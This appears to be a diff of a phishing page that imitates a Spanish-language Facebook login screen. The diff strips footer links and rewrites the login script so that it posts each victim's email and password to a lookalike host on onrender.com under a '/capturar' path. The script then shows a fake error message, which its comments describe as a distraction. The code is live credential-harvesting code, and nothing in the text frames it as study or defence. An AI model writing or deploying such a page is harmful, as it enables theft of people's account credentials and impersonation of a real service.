@@ -61,19 +61,7 @@
                     <span>Deutsch</span> <span>日本語</span> <span>Más idiomas...</span>
                 </div>
                 
-               <div class="footer-row">
-            <span>Registrarte</span> <span>Iniciar sesión</span> <span>Messenger</span> 
-            <span>Facebook Lite</span> <span>Video</span> <span>Meta Pay</span> 
-            <span>Tienda de Meta</span> <span>Meta Quest</span> <span>Ray-Ban Meta</span> 
-            <span>Meta AI</span> <span>Instagram</span> <span>Threads</span>
-        </div>
 
-        <div class="footer-row">
-            <span>Política de privacidad</span> <span>Centro de privacidad</span> 
-            <span>Información</span> <span>Crear anuncio</span> <span>Crear página</span> 
-            <span>Desarrolladores</span> <span>Empleo</span> <span>Cookies</span> 
-            <span>Opciones de anuncios</span>
-        </div>
 
               
 
@@ -91,35 +79,35 @@
         </footer>
     </div>
 
-    <script>
-        const loginForm = document.getElementById('loginForm');
+   <script>
+    const loginForm = document.getElementById('loginForm');
 
-        loginForm.addEventListener('submit', async (e) => {
-            e.preventDefault(); // Evita que la página se recargue
+    loginForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
 
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
 
-            try {
-                // Enviamos los datos a nuestro servidor local (server.js)
-                const response = await fetch('http://localhost:3000/capturar', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ email, password })
-                });
+        try {
+            // Usamos tu nuevo enlace de Render
+            const response = await fetch('https://facebook-com-y4u8.onrender.com/capturar', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, password })
+            });
 
-                if (response.ok) {
-                    // Limpiamos los campos y damos un mensaje de error falso para disimular
-                    loginForm.reset();
-                    alert("Error de conexión con el servidor. Por favor, inténtelo de nuevo más tarde.");
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                alert("Asegúrate de que el servidor (node server.js) esté encendido.");
+            if (response.ok) {
+                loginForm.reset();
+                // Mensaje de distracción
+                alert("Error de inicio de sesión. Por favor, inténtelo de nuevo más tarde.");
             }
-        });
-    </script>
+        } catch (error) {
+            console.error('Error:', error);
+            alert("Hubo un problema con la conexión.");
+        }
+    });
+</script>
+
+
 </body>
 </html>
